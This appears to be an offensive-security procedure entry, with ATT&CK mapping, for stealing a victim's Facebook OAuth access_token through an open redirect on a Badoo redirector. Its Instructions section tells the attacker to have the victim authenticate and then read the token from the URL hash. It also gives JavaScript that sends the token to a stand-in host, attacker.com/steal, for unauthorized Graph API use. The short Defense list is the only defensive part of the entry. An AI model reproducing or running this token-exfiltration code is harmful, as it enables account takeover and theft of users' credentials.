---
id: proc-002
tags:
  - token-theft
  - oauth
  - facebook
type: procedure
tools: []
tactics:
  - '[[Credential Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[T1528.001]]'
updated_at: '2025-12-14T17:24:26.816Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Credential Access]]'
mitre_techniques:
  - '[[T1528.001]]'
---
# Complete-Authentication-and-Capture-Facebook-Token

## Summary

This procedure handles the completion of Facebook authentication, triggering the open redirect that exposes the OAuth access_token in the URL hash on the attacker's domain.

## Description

After initiating the flow, the victim authenticates with Facebook. Facebook then redirects to the Badoo redirector with the token in the hash of the redirect_uri. The Badoo endpoint decodes the state and redirects without validation, loading the attacker's domain while preserving the hash, allowing token extraction.

## Requirements

1. Active Facebook OAuth session from previous step
2. Attacker server to log or capture the redirected request
3. Browser dev tools or proxy (e.g., Burp) to inspect hash

## Defense

Defensive measures and detection strategies:

- Enforce strict redirect validation on endpoints
- Avoid using hash fragments for sensitive data in redirects
- Log and alert on unexpected redirect domains
- Implement token binding to specific clients

## Objectives

1. Obtain access_token post-authentication
2. Extract token from URL hash
3. Use token for unauthorized API access

## Instructions

### Step 1: Perform Authentication

**Context**: Victim logs in with Facebook credentials or links account.

Instruct victim to complete the popup authentication dialog.

> Upon success, Facebook issues the redirect.

### Step 2: Intercept and Extract Token

**Context**: Monitor the redirect chain to capture the token in the hash.

Observe the final URL in browser or proxy:

```url
https://www.google.com/.badoo.com/#access_token=[user_access_token]&expires_in=[number]
```

Use JavaScript on attacker page to parse window.location.hash and send token to attacker server.

```javascript
// On attacker domain page
if (window.location.hash) {
  const params = new URLSearchParams(window.location.hash.substring(1));
  const token = params.get('access_token');
  fetch('https://attacker.com/steal', {method: 'POST', body: token});
}
```

> Token is now available for use in Facebook Graph API calls, e.g., /me?access_token=TOKEN.

## MITRE ATT&CK Mapping

### Tactics

- [[Credential Access]]

### Techniques

- [[T1528.001]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[token-theft]]
- [[oauth]]
- [[facebook]]
